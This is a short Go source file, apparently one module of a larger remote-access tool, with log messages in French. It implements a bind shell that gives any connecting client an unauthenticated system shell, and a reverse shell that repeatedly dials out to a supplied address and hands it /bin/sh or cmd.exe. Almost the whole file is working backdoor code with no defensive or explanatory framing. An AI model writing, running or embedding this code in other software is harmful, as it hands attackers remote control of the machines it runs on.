package main

import (
	"fmt"
	"net"
	"os/exec"
	"time"
)

// BindShell listens on addr and executes /bin/sh (Linux) or cmd.exe (Windows)
// for every incoming connection. No auth — access = shell.
func BindShell(addr string) {
	ln, err := net.Listen("tcp", addr)
	if err != nil {
		fmt.Fprintf(logWriter, "[shell] Bind échoué %s : %v\n", addr, err)
		return
	}
	fmt.Fprintf(logWriter, "[shell] Bind shell en écoute sur %s\n", addr)
	for {
		conn, err := ln.Accept()
		if err != nil {
			continue
		}
		go serveShell(conn)
	}
}

// ReverseShell dials back to addr and hands it a shell.
func ReverseShell(addr string) {
	for attempt := 0; attempt < 5; attempt++ {
		conn, err := net.DialTimeout("tcp", addr, 10*time.Second)
		if err != nil {
			time.Sleep(5 * time.Second)
			continue
		}
		fmt.Fprintf(logWriter, "[shell] Reverse shell connecté à %s\n", addr)
		serveShell(conn)
		return
	}
	fmt.Fprintf(logWriter, "[shell] Reverse shell : impossible de joindre %s\n", addr)
}

func serveShell(conn net.Conn) {
	defer conn.Close()
	sh := shellBin()
	cmd := exec.Command(sh)
	cmd.Stdin = conn
	cmd.Stdout = conn
	cmd.Stderr = conn
	cmd.Run()
}
